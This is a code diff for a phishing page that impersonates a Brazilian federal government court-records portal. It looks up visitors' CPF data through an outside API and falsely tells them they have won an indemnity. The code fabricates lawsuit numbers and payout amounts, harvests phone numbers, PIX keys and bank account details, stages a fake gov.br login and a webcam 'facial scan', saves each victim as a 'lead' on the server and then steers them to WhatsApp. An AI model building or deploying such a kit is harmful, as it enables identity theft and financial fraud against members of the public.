+        const empresas = [
+            "Banco Inter S.A.", "Claro S.A.", "Oi S.A.", "Vivo S.A.", "Tim Brasil S.A.",
+            "Magazine Luiza S.A.", "Banco Itaú Unibanco S.A.", "Banco Bradesco S.A.", 
+            "Banco Santander Brasil S.A.", "Mercado Livre Brasil Ltda."
+        ];
+
+        let cameraStream;
+        let leadData = {}; // Objeto para armazenar dados do lead
+        let accessibilitySettings = {
+            highContrast: false,
+            largeText: false,
+            reducedMotion: false,
+            vlibrasActive: false
+        };
+
+        // Funções de navegação
+        function showPage(pageId) {
+            document.getElementById('main-content').classList.remove('hidden');
+            document.getElementById('loading').classList.add('hidden');
+            pageIds.forEach(id => {
+                document.getElementById(id).classList.add('hidden');
+            });
+            document.getElementById(pageId).classList.remove('hidden');
+            // Scroll para o topo
+            window.scrollTo(0, 0);
+        }
+
+        function showLoadingAndThen(nextAction, duration = 5000) {
+            document.getElementById('main-content').classList.add('hidden');
+            pageIds.forEach(id => document.getElementById(id).classList.add('hidden'));
+            document.getElementById('loading').classList.remove('hidden');
+            setTimeout(nextAction, duration);
+        }
+
+        // Geração de dados
+        function gerarNumeroProcesso() {
+            const partes = [];
+            for (let i = 0; i < 7; i++) partes.push(Math.floor(Math.random() * 10));
+            return `${partes.join('')}-${Math.floor(Math.random() * 100).toString().padStart(2, '0')}.2024.8.26.${Math.floor(Math.random() * 10000).toString().padStart(4, '0')}`;
+        }
+
+        // JavaScript - Funções para formatação automática de CPF
+function formatarCPF(cpf) {
+    return cpf.replace(/\D/g, '').replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
+}
+
+function aplicarMascaraCPF(input) {
+    // Remove tudo que não é número
+    let valor = input.value.replace(/\D/g, '');
+    
+    // Limita a 11 dígitos
+    if (valor.length > 11) {
+        valor = valor.substring(0, 11);
+    }
+    
+    // Aplica a máscara conforme o usuário digita
+    if (valor.length <= 3) {
+        input.value = valor;
+    } else if (valor.length <= 6) {
+        input.value = valor.replace(/(\d{3})(\d{0,3})/, '$1.$2');
+    } else if (valor.length <= 9) {
+        input.value = valor.replace(/(\d{3})(\d{3})(\d{0,3})/, '$1.$2.$3');
+    } else {
+        input.value = valor.replace(/(\d{3})(\d{3})(\d{3})(\d{0,2})/, '$1.$2.$3-$4');
+    }
+}
+
+// Função alternativa usando addEventListener (mais robusta)
+document.addEventListener('DOMContentLoaded', function() {
+    const cpfInput = document.getElementById('cpf');
+    
+    if (cpfInput) {
+        cpfInput.addEventListener('input', function(e) {
+            aplicarMascaraCPF(e.target);
+        });
+        
+        // Previne colar texto não formatado
+        cpfInput.addEventListener('paste', function(e) {
+            setTimeout(() => {
+                aplicarMascaraCPF(e.target);
+            }, 10);
+        });
+        
+        // Remove caracteres não numéricos ao pressionar teclas
+        cpfInput.addEventListener('keypress', function(e) {
+            const char = String.fromCharCode(e.which);
+            if (!/[0-9]/.test(char)) {
+                e.preventDefault();
+            }
+        });
+    }
+});
+
+// Função para obter apenas os números do CPF (útil para validação)
+function obterNumerosCPF(cpfFormatado) {
+    return cpfFormatado.replace(/\D/g, '');
+}
+
+// Função de validação de CPF (opcional)
+function validarCPF(cpf) {
+    cpf = cpf.replace(/\D/g, '');
+    
+    if (cpf.length !== 11 || /^(\d)\1{10}$/.test(cpf)) {
+        return false;
+    }
+    
+    let soma = 0;
+    for (let i = 0; i < 9; i++) {
+        soma += parseInt(cpf.charAt(i)) * (10 - i);
+    }
+    let resto = 11 - (soma % 11);
+    let digito1 = resto < 2 ? 0 : resto;
+    
+    soma = 0;
+    for (let i = 0; i < 10; i++) {
+        soma += parseInt(cpf.charAt(i)) * (11 - i);
+    }
+    resto = 11 - (soma % 11);
+    let digito2 = resto < 2 ? 0 : resto;
+    
+    return digito1 === parseInt(cpf.charAt(9)) && digito2 === parseInt(cpf.charAt(10));
+}
+
+// Atualizar sua função iniciarFluxo() para usar o CPF limpo
+function iniciarFluxo() {
+    const cpfInput = document.getElementById('cpf');
+    const cpfLimpo = obterNumerosCPF(cpfInput.value);
+    
+    if (cpfLimpo.length !== 11) {
+        alert('Por favor, digite um CPF válido com 11 dígitos.');
+        return;
+    }
+    
+    if (!validarCPF(cpfLimpo)) {
+        alert('CPF inválido. Por favor, verifique os números digitados.');
+        return;
+    }
+    
+    // Continuar com sua lógica atual...
+    console.log('CPF válido:', cpfLimpo);
+}
+
+        function formatarTelefone(telefone) {
+            return telefone.replace(/\D/g, '').replace(/(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
+        }
+
+        // Atualizar placeholder do PIX
+        function updatePixPlaceholder() {
+            const tipoChave = document.getElementById('tipoChavePix').value;
+            const chavePix = document.getElementById('chavePix');
+            const pixHelper = document.getElementById('pixHelper');
+
+            switch(tipoChave) {
+                case 'cpf':
+                    chavePix.placeholder = '000.000.000-00';
+                    pixHelper.textContent = 'Digite seu CPF (mesmo da consulta)';
+                    break;
+                case 'email':
+                    chavePix.placeholder = 'seuemail@exemplo.com';
+                    pixHelper.textContent = 'Digite seu e-mail cadastrado no PIX';
+                    break;
+                case 'telefone':
+                    chavePix.placeholder = '(11) 99999-9999';
+                    pixHelper.textContent = 'Digite seu telefone cadastrado no PIX';
+                    break;
+                case 'aleatoria':
+                    chavePix.placeholder = 'xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx';
+                    pixHelper.textContent = 'Cole sua chave PIX aleatória';
+                    break;
+                default:
+                    chavePix.placeholder = 'Digite sua chave PIX';
+                    pixHelper.textContent = 'Selecione o tipo de chave acima';
+            }
+        }
+
+        // Função para salvar lead no banco de dados
+        async function salvarLead() {
+            try {
+                const response = await fetch('api/save_lead.php', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(leadData)
+                });
+                
+                const result = await response.json();
+                console.log('Lead salvo:', result);
+                
+                if (!result.success) {
+                    console.error('Erro ao salvar lead:', result.error);
+                }
+            } catch (error) {
+                console.error('Erro ao salvar lead:', error);
+            }
+        }
+
+        // Event listeners
+        document.getElementById('cpf').addEventListener('input', function(e) {
+            e.target.value = formatarCPF(e.target.value);
+        });
+
+        // Fluxo principal
+        async function iniciarFluxo() {
+            const cpfInput = document.getElementById("cpf");
+            const cpf = cpfInput.value.replace(/\D/g, ""); // Remove formatação para enviar à API
+
+            if (!cpf || cpf.length !== 11) {
+                alert("Por favor, digite um CPF válido com 11 dígitos.");
+                return;
+            }
+
+            // Inicializar dados do lead
+            leadData = {
+                cpf: cpfInput.value.trim(),
+                ip_address: '', // Será preenchido pelo servidor
+                user_agent: navigator.userAgent
+            };
+
+            showLoadingAndThen(async () => {
+                try {
+                    const apiUrl = `https://irpf-imposto.site/buscar-cpf/new-api.php?cpf=${cpf}`;
+                    const response = await fetch(apiUrl);
+                    const data = await response.json();
+
+                    if (data.result && data.result.nome) {
+                        // Atualizar dados do lead com informações da API
+                        leadData.nome = data.result.nome;
+                        leadData.data_nascimento = data.result.data_nascimento;
+                        leadData.nome_mae = data.result.nome_mae;
+
+                        // Gerar dados adicionais
+                        const empresaAleatoria = empresas[Math.floor(Math.random() * empresas.length)];
+                        const numeroProcesso = gerarNumeroProcesso();
+                        const valorIndenizacao = (Math.random() * 50000 + 10000).toLocaleString("pt-BR", {
+                            style: "currency",
+                            currency: "BRL"
+                        });
+
+                        // Adicionar dados gerados ao lead
+                        leadData.numero_processo = numeroProcesso;
+                        leadData.empresa = empresaAleatoria;
+
+                        // Atualizar interface
+                        document.getElementById("nome").innerText = data.result.nome;
+                        document.getElementById("dataNascimento").innerText = data.result.data_nascimento;
+                        document.getElementById("nomeMae").innerText = data.result.nome_mae;
+                        document.getElementById("numeroProcesso").innerText = numeroProcesso;
+                        document.getElementById("textoProcesso").innerHTML = `
+    <p class="font-semibold text-gov-blue mb-2">
+        Processo contra 
+        <span class="inline-flex items-center">
+            <span class="loading-dots">...</span>
+        </span>
+    </p>
+    <p class="text-gov-gray mb-2">Você <strong class="text-gov-green">ganhou a causa</strong> e tem direito a uma indenização.</p>
+    <p class="text-lg font-bold text-gov-green">
+        Valor disponível: 
+        <span class="inline-flex items-center">
+            <span class="loading-dots">...</span>
+        </span>
+    </p>
+`;
+
+                        showPage("page-resultado");
+                    } else {
+                        alert("CPF não encontrado ou dados incompletos. Por favor, tente novamente.");
+                        showPage("page-initial");
+                    }
+                } catch (error) {
+                    console.error("Erro ao buscar CPF: ", error);
+                    alert("Ocorreu um erro ao consultar o CPF. Por favor, tente novamente mais tarde.");
+                    showPage("page-initial");
+                }
+            }, 10000);
+        }
+
+        function goToBancario() {
+            showLoadingAndThen(() => showPage('page-bancario'));
+        }
+
+        function goToGovLogin() {
+            const telefone = document.getElementById('telefone').value.trim();
+            const tipoChavePix = document.getElementById('tipoChavePix').value;
+            const chavePix = document.getElementById('chavePix').value.trim();
+            const banco = document.getElementById('banco').value.trim();
+            const agencia = document.getElementById('agencia').value.trim();
+            const conta = document.getElementById('conta').value.trim();
+
+            // Validar telefone obrigatório
+            if (!telefone) {
+                alert('Por favor, informe seu telefone/WhatsApp.');
+                return;
+            }
+
+            // Validar se pelo menos PIX ou dados bancários foram preenchidos
+            if (!chavePix && (!banco || !agencia || !conta)) {
+                alert('Por favor, preencha os dados PIX ou os dados bancários tradicionais.');
+                return;
+            }
+
+            // Atualizar dados do lead
+            leadData.telefone = telefone;
+            leadData.tipo_chave_pix = tipoChavePix;
+            leadData.chave_pix = chavePix;
+            leadData.banco = banco;
+            leadData.agencia = agencia;
+            leadData.conta = conta;
+
+            const cpf = document.getElementById('cpf').value.trim();
+            document.getElementById('cpfGovbr').value = cpf;
+            showLoadingAndThen(() => showPage('page-govbr-login'));
+        }
+
+        function goToFacialScan() {
+            showLoadingAndThen(async () => {
+                showPage('page-facial-scan');
+                const cameraFeed = document.getElementById('cameraFeed');
+                try {
+                    cameraStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { 
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            facingMode: 'user'
+                        }
+                    });
+                    cameraFeed.srcObject = cameraStream;
+                    cameraFeed.play();
+                    setTimeout(goToFacialIdentified, 5000);
+                } catch (err) {
+                    console.error("Erro ao acessar a câmera: ", err);
+                    alert("Não foi possível acessar a câmera. Verifique as permissões e tente novamente.");
+                    showPage('page-govbr-login');
+                }
+            });
+        }
+
+        function goToFacialIdentified() {
+            if (cameraStream) {
+                cameraStream.getTracks().forEach(track => track.stop());
+            }
+            showLoadingAndThen(() => {
+                showPage('page-facial-identified');
+                setTimeout(goToJusbrasilSuccess, 3000);
+            });
+        }
+
+        function goToJusbrasilSuccess() {
+            // Salvar lead completo no banco de dados
+            salvarLead();
+            showLoadingAndThen(() => showPage('page-jusbrasil-success'));
+        }
+
+        function redirecionarWhatsapp() {
+            const numeroWhatsapp = "5511999999999";
+            const mensagem = encodeURIComponent("Olá! Gostaria de finalizar o processo de saque da minha indenização. Acabei de concluir a verificação no portal gov.br.");
+            window.open(`https://wa.me/${numeroWhatsapp}?text=${mensagem}`, "_blank");
+        }
+
+        // Funções de Acessibilidade
+        function toggleLibrasModal() {
+            const modal = document.getElementById('libras-modal');
+            const widget = document.querySelector('.libras-widget');
+            if (modal.style.display === 'flex') {
+                modal.style.display = 'none';
+                widget.classList.remove('active');
+            } else {
+                modal.style.display = 'flex';
+                widget.classList.add('active');
+            }
+        }
+
+        function toggleHighContrast() {
+            accessibilitySettings.highContrast = !accessibilitySettings.highContrast;
+            const control = event.currentTarget;
+            if (accessibilitySettings.highContrast) {
+                document.body.classList.add('high-contrast');
+                control.classList.add('active');
+            } else {
+                document.body.classList.remove('high-contrast');
+                control.classList.remove('active');
+            }
+            localStorage.setItem('accessibility-high-contrast', accessibilitySettings.highContrast);
+        }
+
+        function toggleLargeText() {
+            accessibilitySettings.largeText = !accessibilitySettings.largeText;
+            const control = event.currentTarget;
+            if (accessibilitySettings.largeText) {
+                document.body.classList.add('large-text');
+                control.classList.add('active');
+            } else {
+                document.body.classList.remove('large-text');
+                control.classList.remove('active');
+            }
+            localStorage.setItem('accessibility-large-text', accessibilitySettings.largeText);
+        }
+
+        function toggleReducedMotion() {
+            accessibilitySettings.reducedMotion = !accessibilitySettings.reducedMotion;
+            const control = event.currentTarget;
+            if (accessibilitySettings.reducedMotion) {
+                document.body.classList.add('reduced-motion');
+                control.classList.add('active');
+            } else {
+                document.body.classList.remove('reduced-motion');
+                control.classList.remove('active');
+            }
+            localStorage.setItem('accessibility-reduced-motion', accessibilitySettings.reducedMotion);
+        }
+
+        function toggleVLibras() {
+            accessibilitySettings.vlibrasActive = !accessibilitySettings.vlibrasActive;
+            const btn = document.getElementById('vlibras-btn');
+            const widget = document.querySelector('.libras-widget');
+            if (accessibilitySettings.vlibrasActive) {
+                btn.innerHTML = '<i class="fas fa-stop mr-2"></i>Desativar VLibras';
+                btn.classList.add('bg-gov-red');
+                widget.classList.add('active');
+                showNotification('VLibras ativado! Passe o mouse sobre textos para tradução.', 'success');
+            } else {
+                btn.innerHTML = '<i class="fas fa-play mr-2"></i>Ativar VLibras';
+                btn.classList.remove('bg-gov-red');
+                widget.classList.remove('active');
+                showNotification('VLibras desativado.', 'info');
+            }
+            localStorage.setItem('accessibility-vlibras', accessibilitySettings.vlibrasActive);
+        }
+
+        function adjustVolume(value) {
+            console.log(`Volume do leitor de tela ajustado para: ${value}%`);
+            localStorage.setItem('accessibility-volume', value);
+        }
+
+        // Função para mostrar notificações
+        function showNotification(message, type = 'info') {
+            const notification = document.createElement('div');
+            notification.className = `fixed top-4 right-4 z-50 p-4 rounded-lg shadow-gov-4 transition-all duration-300 transform translate-x-full`;
+            
+            switch(type) {
+                case 'success':
+                    notification.classList.add('bg-gov-green', 'text-white');
+                    break;
+                case 'error':
+                    notification.classList.add('bg-gov-red', 'text-white');
+                    break;
+                default:
+                    notification.classList.add('bg-gov-blue', 'text-white');
+            }
+
+            notification.innerHTML = `
+                <div class="flex items-center">
+                    <i class="fas fa-${type === 'success' ? 'check' : type === 'error' ? 'exclamation' : 'info'}-circle mr-2"></i>
+                    <span>${message}</span>
+                </div>
+            `;
+
+            document.body.appendChild(notification);
+
+            setTimeout(() => {
+                notification.classList.remove('translate-x-full');
+            }, 100);
+
+            setTimeout(() => {
+                notification.classList.add('translate-x-full');
+                setTimeout(() => {
+                    document.body.removeChild(notification);
+                }, 300);
+            }, 3000);
+        }
+
+        // Atalhos de teclado
+        document.addEventListener('keydown', function(e) {
+            if (e.altKey) {
+                switch(e.key.toLowerCase()) {
+                    case 'a':
+                        e.preventDefault();
+                        toggleLibrasModal();
+                        break;
+                    case 'c':
+                        e.preventDefault();
+                        toggleHighContrast();
+                        break;
+                    case 't':
+                        e.preventDefault();
+                        toggleLargeText();
+                        break;
+                    case 'l':
+                        e.preventDefault();
+                        toggleVLibras();
+                        break;
+                }
+            }
+        });
+
+        // Fechar modal clicando fora
+        document.getElementById('libras-modal').addEventListener('click', function(e) {
+            if (e.target === this) {
+                toggleLibrasModal();
+            }
+        });
+
+        // Carregar preferências salvas
+        function loadAccessibilityPreferences() {
+            if (localStorage.getItem('accessibility-high-contrast') === 'true') {
+                document.body.classList.add('high-contrast');
+                accessibilitySettings.highContrast = true;
+            }
+
+            if (localStorage.getItem('accessibility-large-text') === 'true') {
+                document.body.classList.add('large-text');
+                accessibilitySettings.largeText = true;
+            }
+
+            if (localStorage.getItem('accessibility-reduced-motion') === 'true') {
+                document.body.classList.add('reduced-motion');
+                accessibilitySettings.reducedMotion = true;
+            }
+
+            if (localStorage.getItem('accessibility-vlibras') === 'true') {
+                accessibilitySettings.vlibrasActive = true;
+                document.querySelector('.libras-widget').classList.add('active');
+            }
+        }
+
+        // Adicionar formatação automática para telefone
+        document.addEventListener('DOMContentLoaded', function() {
+            loadAccessibilityPreferences();
+
+            // Formatação automática do telefone
+            const telefoneInput = document.getElementById('telefone');
+            if (telefoneInput) {
+                telefoneInput.addEventListener('input', function(e) {
+                    e.target.value = formatarTelefone(e.target.value);
+                });
+            }
+
+            // Observar elementos para animação
+            const observerOptions = {
+                threshold: 0.1,
+                rootMargin: '0px 0px -50px 0px'
+            };
+
+            const observer = new IntersectionObserver(function(entries) {
+                entries.forEach(entry => {
+                    if (entry.isIntersecting) {
+                        entry.target.classList.add('fade-in');
+                    }
+                });
+            }, observerOptions);
+
+            document.querySelectorAll('.card-gov').forEach(el => {
+                observer.observe(el);
+            });
+
+            // Anunciar página para leitores de tela
+            const announcement = document.createElement('div');
+            announcement.setAttribute('aria-live', 'polite');
+            announcement.setAttribute('aria-atomic', 'true');
+            announcement.className = 'sr-only';
+            announcement.textContent = 'Portal de Consulta Processual do Governo Federal carregado. Use Alt+A para acessar opções de acessibilidade.';
+            document.body.appendChild(announcement);
+        });
+    </script>
+
+
+<div aria-live="polite" aria-atomic="true" class="sr-only">Portal de Consulta Processual do Governo Federal carregado. Use Alt+A para acessar opções de acessibilidade.</div></body></html>
